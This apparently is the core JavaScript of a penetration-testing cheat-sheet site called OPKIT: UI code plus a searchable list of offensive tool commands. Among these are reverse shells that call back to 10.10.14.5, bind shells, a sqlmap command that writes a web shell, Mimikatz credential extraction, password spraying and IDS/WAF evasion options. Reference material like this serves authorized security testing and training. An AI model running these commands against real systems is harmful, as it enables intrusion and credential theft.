/**
 * OPKIT — Platform Core JavaScript
 * Handles: Themes, Search, Category Filters, Copy Interactions, Scrollspy, Mobile Navigation
 */

/* ── 1. THEME MANAGEMENT ───────────────────────────────── */
(function initTheme() {
  const stored = localStorage.getItem('opkit-theme');
  if (stored === 'light' || (!stored && window.matchMedia('(prefers-color-scheme: light)').matches)) {
    document.body.classList.add('theme-light');
  }
})();

function toggleTheme() {
  const isLight = document.body.classList.toggle('theme-light');
  localStorage.setItem('opkit-theme', isLight ? 'light' : 'dark');
  updateThemeIcon();
}

function updateThemeIcon() {
  const isLight = document.body.classList.contains('theme-light');
  document.querySelectorAll('[data-theme-icon]').forEach(el => {
    el.innerHTML = isLight
      ? `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M6.34 17.66l-1.41 1.41M19.07 4.93l-1.41 1.41"/></svg>`
      : `<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>`;
  });
}

document.addEventListener('DOMContentLoaded', updateThemeIcon);

/* ── 2. COPY & TOAST INTERACTIONS ───────────────────────── */
let copyToastEl = null;
let toastTimeout = null;

function getCopyToast() {
  if (!copyToastEl) {
    copyToastEl = document.createElement('div');
    copyToastEl.className = 'copy-toast';
    copyToastEl.setAttribute('role', 'status');
    copyToastEl.setAttribute('aria-live', 'polite');
    document.body.appendChild(copyToastEl);
  }
  return copyToastEl;
}

function showCopyToast(msg = 'Copied to clipboard') {
  const toast = getCopyToast();
  toast.textContent = msg;
  toast.classList.add('is-visible');
  clearTimeout(toastTimeout);
  toastTimeout = setTimeout(() => {
    toast.classList.remove('is-visible');
  }, 1800);
}

function copyText(text, triggerEl) {
  const clean = text.trim();
  if (!clean) return;

  const successFeedback = () => {
    showCopyToast(clean.length > 32 ? `Copied: ${clean.slice(0, 32)}…` : `Copied: ${clean}`);
    if (triggerEl) {
      triggerEl.classList.add('is-copied');
      const originalHTML = triggerEl.innerHTML;
      if (triggerEl.classList.contains('code-line__copy-btn')) {
        triggerEl.innerHTML = `<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> Copied`;
      }
      setTimeout(() => {
        triggerEl.classList.remove('is-copied');
        if (triggerEl.classList.contains('code-line__copy-btn')) {
          triggerEl.innerHTML = originalHTML;
        }
      }, 1600);
    }
  };

  if (navigator.clipboard && window.isSecureContext) {
    navigator.clipboard.writeText(clean).then(successFeedback).catch(() => fallbackCopy(clean, successFeedback));
  } else {
    fallbackCopy(clean, successFeedback);
  }
}

function fallbackCopy(text, cb) {
  const ta = document.createElement('textarea');
  ta.value = text;
  ta.style.position = 'fixed';
  ta.style.left = '-9999px';
  document.body.appendChild(ta);
  ta.select();
  try {
    document.execCommand('copy');
    cb();
  } catch (err) {
    console.error('Failed to copy', err);
  }
  document.body.removeChild(ta);
}

// Delegate copy button clicks
document.addEventListener('click', e => {
  const btn = e.target.closest('.code-line__copy-btn');
  if (btn) {
    const line = btn.closest('.code-line');
    const code = line?.querySelector('.code-line__code');
    if (code) {
      // Remove prompt character if caught in selection
      let t = code.textContent.trim();
      copyText(t, btn);
    }
    return;
  }

  // Click on cheat-grid cells to copy directly
  const cheatCell = e.target.closest('.cheat-cell');
  if (cheatCell) {
    const code = cheatCell.querySelector('.cheat-cell__code');
    if (code) {
      copyText(code.textContent.trim(), cheatCell);
    }
  }
});

/* ── 3. UNIVERSAL SEARCH DATABASE & RUNTIME ─────────────── */
const MASTER_COMMANDS = [
  // Nmap
  { tool:'Nmap', cmd:'nmap -sV -sC -p- 10.10.10.1', desc:'Full TCP port scan with service versions and default scripts', target:'nmap.html#scan-types' },
  { tool:'Nmap', cmd:'nmap -p- --min-rate 2000 -sV -T4 10.10.10.1', desc:'Fast full-port scan with rate control', target:'nmap.html#timing' },
  { tool:'Nmap', cmd:'nmap 10.10.10.0/24 --exclude 10.10.10.1', desc:'Exclude out-of-scope hosts', target:'nmap.html#target-scope' },
  { tool:'Nmap', cmd:'nmap -sL 10.10.10.0/24', desc:'Dry-run target list verification without packet transmission', target:'nmap.html#target-scope' },
  { tool:'Nmap', cmd:'nmap -D RND:10 10.10.10.1', desc:'Decoy scanning for firewall/IDS evasion', target:'nmap.html#evasion' },
  { tool:'Nmap', cmd:'nmap -sA 10.10.10.1', desc:'Map firewall rulesets (TCP ACK scan)', target:'nmap.html#scan-types' },
  { tool:'Nmap', cmd:'nmap -p445 --script smb-vuln-ms17-010 10.10.10.1', desc:'Check EternalBlue (MS17-010) vulnerability', target:'nmap.html#nse' },
  { tool:'Nmap', cmd:'nmap -sn 192.168.1.0/24', desc:'Host discovery ping sweep (no port scanning)', target:'nmap.html#discovery' },
  { tool:'Nmap', cmd:'nmap -A -T4 10.10.10.1', desc:'Aggressive scan: OS detection, versioning, script scan, traceroute', target:'nmap.html#scan-types' },
  { tool:'Nmap', cmd:'nmap --script vuln 10.10.10.1', desc:'Audit target with Nmap Vulnerability Script category', target:'nmap.html#nse' },
  { tool:'Nmap', cmd:'nmap -sU --top-ports 100 10.10.10.1', desc:'Scan top 100 most common UDP ports with timeout safety', target:'nmap.html#scan-types' },
  { tool:'Nmap', cmd:'nmap -Pn 10.10.10.1', desc:'Treat all hosts as online (skip ICMP ping probes)', target:'nmap.html#discovery' },
  { tool:'Nmap', cmd:'nmap -oA full_scan 10.10.10.1', desc:'Save output in standard, XML, and grepable formats', target:'nmap.html#output' },
  { tool:'Nmap', cmd:'nmap -O --osscan-guess 10.10.10.1', desc:'Aggressive OS fingerprinting guess', target:'nmap.html#service-os' },

  // Hydra
  { tool:'Hydra', cmd:'hydra -L users.txt -p \'Welcome@2024\' -t 1 -W 30 ssh://10.0.0.5', desc:'Password spray across user list with 30s inter-attempt delay', target:'hydra.html#spraying' },
  { tool:'Hydra', cmd:'hydra -l admin -P rockyou.txt -t 4 -W 5 ssh://10.0.10.1', desc:'Targeted SSH brute-force with thread limits to prevent dropped packets', target:'hydra.html#usage' },
  { tool:'Hydra', cmd:'hydra -l admin -P rockyou.txt -t 4 -W 5 10.0.10.1 http-post-form', desc:'HTTP POST web application form authentication attack (calibrated)', target:'hydra.html#http' },
  { tool:'Hydra', cmd:'hydra -l admin -P passwords.txt -t 1 -W 60 ssh://10.0.10.5', desc:'Slow-and-low timing evasion (1 attempt/min) to stay under IDS thresholds', target:'hydra.html#timing' },
  { tool:'Hydra', cmd:'hydra -L users.txt -P seasonal_passwords.txt -u -t 1 -W 20 ssh://10.0.10.5', desc:'Multi-password spraying looping users first (-u) to avoid lockouts', target:'hydra.html#spraying' },
  { tool:'Hydra', cmd:'hydra -l Administrator -P rockyou.txt -t 1 -W 10 rdp://10.10.10.1', desc:'RDP single-threaded credential testing avoiding FreeRDP crashes & 4625 bursts', target:'hydra.html#rdp-smb' },
  { tool:'Hydra', cmd:'hydra -L users.txt -P pass.txt -t 2 smb://10.10.10.1', desc:'SMB Windows share & domain credential testing', target:'hydra.html#rdp-smb' },
  { tool:'Hydra', cmd:'hydra -l root -P pass.txt -t 4 mysql://10.10.10.1', desc:'MySQL database credential authentication attack', target:'hydra.html#rdp-smb' },
  { tool:'Hydra', cmd:'nxc ssh 192.168.1.0/24 -u users.txt -p \'Password1!\' --no-bruteforce', desc:'NetExec subnet-wide credential spray without account lockouts', target:'hydra.html#alternatives' },
  { tool:'Hydra', cmd:'kerbrute passwordspray -d corp.local --dc 10.0.10.2 users.txt \'Welcome@2024\'', desc:'Kerbrute Kerberos pre-authentication spray avoiding NTLM event noise', target:'hydra.html#alternatives' },

  // Metasploit
  { tool:'Metasploit', cmd:'msfconsole -q', desc:'Launch Metasploit console in quiet mode', target:'metasploit.html#overview' },
  { tool:'Metasploit', cmd:'msfdb init', desc:'Initialize PostgreSQL database backend for MSF', target:'metasploit.html#database' },
  { tool:'Metasploit', cmd:'workspace -a ClientA', desc:'Create and switch to an engagement workspace', target:'metasploit.html#database' },
  { tool:'Metasploit', cmd:'db_import scan.xml', desc:'Import Nmap XML results directly into MSF database', target:'metasploit.html#database' },
  { tool:'Metasploit', cmd:'makerc /tmp/eng.rc', desc:'Save console command history as replayable script', target:'metasploit.html#database' },
  { tool:'Metasploit', cmd:'spool /tmp/eng.log', desc:'Log all console output to engagement evidence file', target:'metasploit.html#database' },
  { tool:'Metasploit', cmd:'search type:exploit platform:windows', desc:'Search modules filtered by exploit type and platform', target:'metasploit.html#search' },
  { tool:'Metasploit', cmd:'use auxiliary/scanner/smb/smb_version', desc:'Scan subnet for SMB OS and service versions', target:'metasploit.html#search' },
  { tool:'Metasploit', cmd:'check', desc:'Safely validate target vulnerability without firing exploit', target:'metasploit.html#pitfalls' },
  { tool:'Metasploit', cmd:'setg LHOST 10.10.14.5', desc:'Set persistent global attacking IP across all modules', target:'metasploit.html#search' },
  { tool:'Metasploit', cmd:'use exploit/multi/handler', desc:'Initialize universal multi-handler listener', target:'metasploit.html#payloads' },
  { tool:'Metasploit', cmd:'portfwd add -l 3389 -p 3389 -r 172.16.1.10', desc:'Pivot local port to internal subnet host via Meterpreter', target:'metasploit.html#meterpreter' },
  { tool:'Metasploit', cmd:'use post/multi/recon/local_exploit_suggester', desc:'Automated privilege escalation exploit suggester', target:'metasploit.html#meterpreter' },
  { tool:'Metasploit', cmd:'msfvenom -p windows/x64/meterpreter_reverse_https MALLEABLEC2=profile.txt', desc:'Generate EDR-evasive payload with Malleable C2', target:'metasploit.html#msfvenom' },
  { tool:'Metasploit', cmd:'load kiwi; creds_all', desc:'In-memory Mimikatz credential extraction', target:'metasploit.html#meterpreter' },

  // ffuf
  { tool:'ffuf', cmd:'ffuf -w wordlist.txt -u https://target/FUZZ -ac', desc:'Calibrated directory scan with baseline filter', target:'ffuf.html#directory' },
  { tool:'ffuf', cmd:'ffuf -w wordlist.txt -u https://target/FUZZ -ac -e .php,.bak,.zip', desc:'Directory fuzzing with extensions and backup files', target:'ffuf.html#directory' },
  { tool:'ffuf', cmd:'ffuf -request request.txt -w wordlist.txt -ac', desc:'Fuzz an authenticated request exported from Burp', target:'ffuf.html#fuzzing' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -mc 200 -ac', desc:'Fuzz directories restricting to HTTP 200 hits only', target:'ffuf.html#directory' },
  { tool:'ffuf', cmd:'ffuf -w subs.txt -u https://target -H "Host: FUZZ.target" -ac', desc:'Auto-calibrated virtual host (VHost) discovery', target:'ffuf.html#vhosts' },
  { tool:'ffuf', cmd:'ffuf -w users.txt:W1 -w passwords.txt:W2 -mode pitchfork -ac', desc:'Multi-wordlist paired attack (Pitchfork mode)', target:'ffuf.html#fuzzing' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -x http://127.0.0.1:8080 -ac', desc:'Route ffuf traffic through Burp Proxy', target:'ffuf.html#flags' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -rate 20 -ac', desc:'Rate-limited fuzzing to prevent target overload', target:'ffuf.html#flags' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -o results.json -of json', desc:'Save fuzzing results as structured JSON', target:'ffuf.html#flags' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -o results.html -of html', desc:'Generate client-ready HTML fuzzing report', target:'ffuf.html#flags' },
  { tool:'ffuf', cmd:'ffuf -w params.txt -u "https://target/page?FUZZ=value" -ac', desc:'Fuzz hidden GET query parameters', target:'ffuf.html#fuzzing' },
  { tool:'ffuf', cmd:'ffuf -w list.txt -u https://target/FUZZ -fc 404', desc:'Filter out 404 responses', target:'ffuf.html#filtering' },

  // Gobuster
  { tool:'Gobuster', cmd:'gobuster dir -u https://target -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,bak,old --exclude-length 2899', desc:'Calibrated directory scan with extension hunting', target:'gobuster.html#dir' },
  { tool:'Gobuster', cmd:'gobuster vhost -u https://target -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain', desc:'Virtual host discovery with appended domain', target:'gobuster.html#vhost' },
  { tool:'Gobuster', cmd:'gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -i', desc:'DNS subdomain brute-force with IP resolution', target:'gobuster.html#dns' },
  { tool:'Gobuster', cmd:'gobuster fuzz -u "https://target/page?FUZZ=test" -w params.txt', desc:'URL and parameter fuzzing mode', target:'gobuster.html#fuzz' },
  { tool:'Gobuster', cmd:'gobuster s3 -w bucket-names.txt', desc:'Enumerate public Amazon S3 buckets', target:'gobuster.html#cloud' },
  { tool:'Gobuster', cmd:'gobuster gcs -w bucket-names.txt', desc:'Enumerate Google Cloud Storage buckets', target:'gobuster.html#cloud' },
  { tool:'Gobuster', cmd:'gobuster tftp -s tftp.target.com -w filenames.txt', desc:'Brute-force filenames on a TFTP server', target:'gobuster.html#tftp' },
  { tool:'Gobuster', cmd:'gobuster dir -u https://target -w list.txt -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"', desc:'WAF bypass with custom browser User-Agent', target:'gobuster.html#flags' },
  { tool:'Gobuster', cmd:'gobuster dir -u https://target -w list.txt -b 403,404', desc:'Blacklist unwanted status codes', target:'gobuster.html#dir' },
  { tool:'Gobuster', cmd:'gobuster dir -u https://target -w list.txt --delay 1500ms', desc:'Rate-limited scanning with thread delays', target:'gobuster.html#flags' },

  // Burp Suite
  { tool:'Burp Suite', cmd:'curl --proxy http://127.0.0.1:8080 -k https://target.com', desc:'Route CLI HTTP traffic through Burp Suite proxy', target:'burpsuite.html#proxy' },
  { tool:'Burp Suite', cmd:'Ctrl+R', desc:'Send active request to Repeater tab', target:'burpsuite.html#repeater' },
  { tool:'Burp Suite', cmd:'Ctrl+I', desc:'Send active request to Intruder fuzzer', target:'burpsuite.html#intruder' },
  { tool:'Burp Suite', cmd:'Ctrl+Shift+R', desc:'Toggle proxy intercept on or off', target:'burpsuite.html#shortcuts' },
  { tool:'Burp Suite', cmd:'Ctrl+F', desc:'Forward intercepted request in Proxy', target:'burpsuite.html#shortcuts' },
  { tool:'Burp Suite', cmd:'Proxy > Match and replace', desc:'Spoof User-Agent / rewrite headers automatically', target:'burpsuite.html#proxy' },
  { tool:'Burp Suite', cmd:'Right-click > Do intercept > Response', desc:'Intercept and modify incoming HTTP server responses', target:'burpsuite.html#proxy' },
  { tool:'Burp Suite', cmd:'Intruder > Grep-Match', desc:'Differentiate responses by custom keyword indicators', target:'burpsuite.html#intruder' },
  { tool:'Burp Suite', cmd:'Collaborator > Poll now', desc:'Inspect out-of-band (OAST) blind interactions', target:'burpsuite.html#collaborator' },
  { tool:'Burp Suite', cmd:'Comparer > Words', desc:'Word-by-word visual diff of two HTTP responses', target:'burpsuite.html#comparer' },
  { tool:'Burp Suite', cmd:'Turbo Intruder', desc:'High-speed Python fuzzer for race conditions', target:'burpsuite.html#extensions' },
  { tool:'Burp Suite', cmd:'ffuf -request request.txt -w list.txt -ac', desc:'Pipeline exported Burp request into ffuf', target:'burpsuite.html#cheatsheet' },
  { tool:'Burp Suite', cmd:'sqlmap -r request.txt -p id', desc:'Pipeline exported Burp request into SQLmap', target:'burpsuite.html#cheatsheet' },
  { tool:'Burp Suite', cmd:'https://portswigger.net/burp/documentation/desktop/getting-started', desc:'Official PortSwigger Burp Suite Getting Started Guide', target:'burpsuite.html#overview' },

  // SQLmap
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --batch --dbs', desc:'Detect & list databases in non-interactive batch mode', target:'sqlmap.html#enumeration' },
  { tool:'SQLmap', cmd:'sqlmap -r request.txt -p id --batch', desc:'Test specific parameter from raw Burp request file', target:'sqlmap.html#detection' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --technique=BEU --batch', desc:'Fast & safe technique selection (Boolean, Error, Union)', target:'sqlmap.html#detection' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --os-shell', desc:'Spawn interactive OS shell (subject to FILE & path prerequisites)', target:'sqlmap.html#shell' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --privileges', desc:'Check database user permissions and FILE privilege', target:'sqlmap.html#shell' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --tamper=space2comment,randomcase', desc:'Layered WAF bypass tamper script chaining', target:'sqlmap.html#tamper' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --threads=10 --time-sec=2', desc:'Accelerate slow time-based blind extractions', target:'sqlmap.html#flags' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --flush-session', desc:'Clear stale cached false-negative detection session', target:'sqlmap.html#troubleshooting' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --random-agent', desc:'Evade signature-based WAF rules with randomized User-Agents', target:'sqlmap.html#flags' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"', desc:'Write remote web shell to server document root', target:'sqlmap.html#shell' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" -D app_db -T users --dump', desc:'Dump table contents and extract hashes', target:'sqlmap.html#dump' },
  { tool:'SQLmap', cmd:'sqlmap -u "https://target/page?id=1" --current-user --is-dba', desc:'Enumerate current database user and check DBA admin status', target:'sqlmap.html#enumeration' },

  // Wireshark / TShark
  { tool:'Wireshark', cmd:'tshark -i eth0 -w capture.pcap', desc:'Live packet capture on interface eth0 written to PCAP', target:'wireshark.html#capture' },
  { tool:'Wireshark', cmd:'dumpcap -i eth0 -b filesize:100000 -b files:10', desc:'Long capture ring buffer without memory exhaustion', target:'wireshark.html#capture' },
  { tool:'Wireshark', cmd:'tshark -r capture.pcap -Y "http.authorization" -T fields -e http.authorization', desc:'Dump HTTP Basic auth credentials', target:'wireshark.html#credentials' },
  { tool:'Wireshark', cmd:'tshark -r capture.pcap -Y "http.request.method == \\"POST\\"" -T fields -e http.file_data', desc:'Extract HTTP POST form bodies and credentials', target:'wireshark.html#credentials' },
  { tool:'Wireshark', cmd:'ftp.request.command == "USER"', desc:'Extract cleartext FTP authentication credentials', target:'wireshark.html#credentials' },
  { tool:'Wireshark', cmd:'kerberos.msg_type == 10', desc:'Extract Kerberos AS-REQ usernames from pcap', target:'wireshark.html#credentials' },
  { tool:'Wireshark', cmd:'tls.handshake.type == 1', desc:'Display filter: TLS ClientHello handshake', target:'wireshark.html#filters' },
  { tool:'Wireshark', cmd:'tcp.analysis.flags', desc:'Display filter: TCP anomalies and retransmissions', target:'wireshark.html#filters' },
  { tool:'Wireshark', cmd:'tcp.flags.syn == 1 and tcp.flags.ack == 0', desc:'Display filter: TCP SYN port-scan detection', target:'wireshark.html#filters' },
  { tool:'Wireshark', cmd:'tshark -r capture.pcap -T fields -E header=y -E separator=, -e ip.src -e ip.dst > report.csv', desc:'Extract packet fields and pipe to CSV', target:'wireshark.html#tshark-fields' },
  { tool:'Wireshark', cmd:'tshark -r capture.pcap -q -z conv,tcp', desc:'Display TCP conversation stats and bandwidth', target:'wireshark.html#statistics' },
  { tool:'Wireshark', cmd:'tshark -r cap.pcap --export-objects http,./out/', desc:'Export all HTTP objects and files from pcap', target:'wireshark.html#statistics' },
  { tool:'Wireshark', cmd:'tshark -r cap.pcap -q -z io,stat,1 > summary.txt', desc:'Write pcap throughput summary report to text file', target:'wireshark.html#statistics' },
  { tool:'Wireshark', cmd:'http.request.method == "POST"', desc:'Wireshark display filter for HTTP POST requests', target:'wireshark.html#filters' },
  { tool:'Wireshark', cmd:'frame contains "password"', desc:'Packet display filter searching for cleartext credentials', target:'wireshark.html#filters' },
  { tool:'Wireshark', cmd:'tshark -r capture.pcap -Y "http.request" -T fields -e ip.src -e http.host', desc:'Extract source IP and Host header from PCAP', target:'wireshark.html#tshark-fields' },

  // Netcat / Ncat
  { tool:'Netcat', cmd:'nc -lvnp 4444', desc:'Start a verbose TCP listener on port 4444', target:'netcat.html#listeners' },
  { tool:'Netcat', cmd:'ncat -lvnp 4444 --keep-open', desc:'Persistent Ncat listener for multiple sequential connections', target:'netcat.html#listeners' },
  { tool:'Netcat', cmd:'ncat -lvnp 4444 --ssl', desc:'Encrypted SSL/TLS listener generating ad-hoc certificate', target:'netcat.html#listeners' },
  { tool:'Netcat', cmd:'nc -lunvp 4444', desc:'Start a UDP listener on port 4444', target:'netcat.html#listeners' },
  { tool:'Netcat', cmd:'nc 10.10.10.1 4444', desc:'Connect directly to target TCP host and port', target:'netcat.html#listeners' },
  { tool:'Netcat', cmd:'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1', desc:'Interactive Bash native /dev/tcp reverse shell payload', target:'netcat.html#reverse-shells' },
  { tool:'Netcat', cmd:'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f', desc:'Reliable FIFO reverse shell without -e flag requirement', target:'netcat.html#reverse-shells' },
  { tool:'Netcat', cmd:'python3 -c "import pty; pty.spawn(\'/bin/bash\')"', desc:'Spawn interactive PTY for full TTY upgrade', target:'netcat.html#reverse-shells' },
  { tool:'Netcat', cmd:'nc -lvnp 4444 -e /bin/bash', desc:'Linux bind shell listener (if -e supported)', target:'netcat.html#bind-shells' },
  { tool:'Netcat', cmd:'nc.exe -lvnp 4444 -e cmd.exe', desc:'Windows command prompt bind shell listener', target:'netcat.html#bind-shells' },
  { tool:'Netcat', cmd:'ncat --ssl -lvnp 9999 > file', desc:'Receive encrypted file transfer via Ncat SSL', target:'netcat.html#transfer' },
  { tool:'Netcat', cmd:'nc -w 3 10.10.10.1 22', desc:'Banner grab with 3-second timeout protection', target:'netcat.html#scanning' },
  { tool:'Netcat', cmd:'socat file:`tty`,raw,echo=0 TCP-LISTEN:4444', desc:'Socat listener with native full TTY allocation', target:'netcat.html#alternatives' },

  // John the Ripper
  { tool:'John', cmd:'john --wordlist=rockyou.txt --rules hashes.txt', desc:'Dictionary attack with mangling rules', target:'johntheripper.html#rules' },
  { tool:'John', cmd:'ssh2john id_rsa > hash.txt && john hash.txt', desc:'Extract and crack SSH key passphrase', target:'johntheripper.html#2john' },
  { tool:'John', cmd:'john --format=NT --wordlist=rockyou.txt ntlm.txt', desc:'Crack Windows NTLM hashes with explicit format', target:'johntheripper.html#formats' },
  { tool:'John', cmd:'john --single hashes.txt', desc:'Single crack mode using username and GECOS information', target:'johntheripper.html#attack-modes' },
  { tool:'John', cmd:'john --format=raw-md5 --wordlist=rockyou.txt hashes.txt', desc:'Crack raw MD5 hex hashes with explicit format flag', target:'johntheripper.html#formats' },
  { tool:'John', cmd:'unshadow /etc/passwd /etc/shadow > combined.txt', desc:'Combine Linux passwd and shadow files for cracking', target:'johntheripper.html#2john' },
  { tool:'John', cmd:'john --list=formats | grep <keyword>', desc:'Search and filter supported hash format strings', target:'johntheripper.html#setup' },
  { tool:'John', cmd:'hashid -m -j \'<hash>\'', desc:'Identify unknown hash type and display John/Hashcat flags', target:'johntheripper.html#setup' },
  { tool:'John', cmd:'john --show --format=NT hashes.txt', desc:'Display previously cracked plaintext passwords with format flag', target:'johntheripper.html#attack-modes' },
  { tool:'John', cmd:'john --restore', desc:'Resume interrupted cracking session from record file', target:'johntheripper.html#attack-modes' },
  { tool:'John', cmd:'john --fork=4 --wordlist=rockyou.txt --rules hashes.txt', desc:'Parallelize wordlist cracking across 4 CPU cores', target:'johntheripper.html#rules' },
  { tool:'John', cmd:'zip2john secret.zip > zip_hash.txt', desc:'Extract crackable hash from password-protected ZIP archive', target:'johntheripper.html#2john' }
];

function registerSearchItems(extraItems) {
  if (Array.isArray(extraItems)) {
    extraItems.forEach(it => {
      if (!it.target && it.url) it.target = it.url;
    });
    MASTER_COMMANDS.push(...extraItems);
  }
}

// Resolve correct relative link depending on whether user is in / or /tools/
function resolveToolUrl(target) {
  const isInsideTools = window.location.pathname.includes('/tools/');
  if (isInsideTools) {
    // If target has 'tools/', strip it
    return target.startsWith('tools/') ? target.slice(6) : target;
  } else {
    // We are at root index
    return target.startsWith('tools/') ? target : `tools/${target}`;
  }
}

function initSearchInputs() {
  const configs = [
    { inputId: 'hero-search', dropdownId: 'hero-search-dropdown', max: 8 },
    { inputId: 'nav-search',  dropdownId: 'nav-search-dropdown',  max: 6 }
  ];

  function highlightMatch(text, query) {
    if (!query) return escapeHtml(text);
    const escaped = query.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
    const regex = new RegExp(`(${escaped})`, 'gi');
    return escapeHtml(text).replace(regex, '<mark style="background:var(--c-accent-dim);color:var(--c-accent);font-weight:700;border-radius:2px">$1</mark>');
  }

  function escapeHtml(s) {
    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  }

  configs.forEach(({ inputId, dropdownId, max }) => {
    const input = document.getElementById(inputId);
    const dropdown = document.getElementById(dropdownId);
    if (!input || !dropdown) return;

    let focusedIdx = -1;

    function renderResults(results) {
      if (!results.length) {
        dropdown.innerHTML = `<div class="search-empty">No commands matching "<strong>${escapeHtml(input.value)}</strong>"</div>`;
      } else {
        const activeTarget = typeof getTargetIp === 'function' ? getTargetIp() : '';
        const info = activeTarget && typeof parseTargetInput === 'function' ? parseTargetInput(activeTarget) : null;
        dropdown.innerHTML = results.map((r, i) => {
          const displayCmd = info ? replaceTargetInText(r.cmd, info) : r.cmd;
          return `
          <a class="search-result-item" data-index="${i}" href="${resolveToolUrl(r.target)}" tabindex="-1">
            <span class="search-result-item__tool">${escapeHtml(r.tool)}</span>
            <span class="search-result-item__text">${highlightMatch(displayCmd, input.value.trim())}</span>
            <span class="search-result-item__desc truncate">${escapeHtml(r.desc)}</span>
          </a>
        `;
        }).join('');
      }
      focusedIdx = -1;
      dropdown.classList.add('is-visible');
    }

    input.addEventListener('input', () => {
      const q = input.value.trim().toLowerCase();
      if (!q) {
        dropdown.classList.remove('is-visible');
        return;
      }
      const activeTarget = typeof getTargetIp === 'function' ? getTargetIp() : '';
      const info = activeTarget && typeof parseTargetInput === 'function' ? parseTargetInput(activeTarget) : null;
      const filtered = MASTER_COMMANDS.filter(item => {
        const cmdToCheck = (info ? replaceTargetInText(item.cmd, info) : item.cmd).toLowerCase();
        return cmdToCheck.includes(q) ||
          item.desc.toLowerCase().includes(q) ||
          item.tool.toLowerCase().includes(q) ||
          item.cmd.toLowerCase().includes(q);
      }).slice(0, max);
      renderResults(filtered);
    });

    input.addEventListener('keydown', e => {
      const items = dropdown.querySelectorAll('.search-result-item');
      if (e.key === 'ArrowDown') {
        e.preventDefault();
        focusedIdx = Math.min(focusedIdx + 1, items.length - 1);
        updateFocus(items);
      } else if (e.key === 'ArrowUp') {
        e.preventDefault();
        focusedIdx = Math.max(focusedIdx - 1, -1);
        updateFocus(items);
      } else if (e.key === 'Enter') {
        if (focusedIdx >= 0 && items[focusedIdx]) {
          e.preventDefault();
          items[focusedIdx].click();
        }
      } else if (e.key === 'Escape') {
        dropdown.classList.remove('is-visible');
        input.blur();
      }
    });

    function updateFocus(items) {
      items.forEach((item, i) => {
        item.classList.toggle('is-focused', i === focusedIdx);
        if (i === focusedIdx) item.scrollIntoView({ block: 'nearest' });
      });
    }

    document.addEventListener('click', e => {
      if (!input.contains(e.target) && !dropdown.contains(e.target)) {
        dropdown.classList.remove('is-visible');
      }
    });
  });

  // Global hotkey: press '/' or 'Ctrl+K' / 'Cmd+K' to focus search
  document.addEventListener('keydown', e => {
    if ((e.key === '/' || ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'k')) &&
        !['INPUT', 'TEXTAREA'].includes(document.activeElement.tagName)) {
      e.preventDefault();
      const hero = document.getElementById('hero-search');
      const nav = document.getElementById('nav-search');
      const target = hero || nav;
      if (target) {
        target.focus();
        target.select();
      }
    }
  });
}

document.addEventListener('DOMContentLoaded', initSearchInputs);

/* ── 4. CATEGORY FILTERING (HOMEPAGE) ───────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  const filterPills = document.querySelectorAll('.filter-pill');
  const cards = document.querySelectorAll('.tool-card');
  const sectionCount = document.querySelector('.section-count');
  if (!filterPills.length || !cards.length) return;

  filterPills.forEach(pill => {
    pill.addEventListener('click', () => {
      filterPills.forEach(p => p.classList.remove('is-active'));
      pill.classList.add('is-active');

      const cat = pill.dataset.filter;
      if (cat === 'favorites') {
        const drawer = document.querySelector('.fav-drawer');
        const backdrop = document.querySelector('.fav-drawer-backdrop');
        drawer?.classList.add('is-open');
        backdrop?.classList.add('is-open');
        return;
      }
      let visibleCount = 0;

      cards.forEach(card => {
        const matches = cat === 'all' || card.dataset.category === cat;
        if (matches) {
          card.classList.remove('is-hidden');
          visibleCount++;
        } else {
          card.classList.add('is-hidden');
        }
      });

      if (sectionCount) {
        sectionCount.textContent = `${visibleCount} tool${visibleCount === 1 ? '' : 's'}`;
      }
    });
  });
});

/* ── 5. SIDEBAR NAVIGATION & SCROLLSPY ──────────────────── */
document.addEventListener('DOMContentLoaded', () => {
  const sidebarLinks = document.querySelectorAll('.sidebar-nav-item[data-section]');
  if (!sidebarLinks.length) return;

  const observer = new IntersectionObserver(entries => {
    entries.forEach(entry => {
      if (entry.isIntersecting) {
        const id = entry.target.id;
        sidebarLinks.forEach(l => {
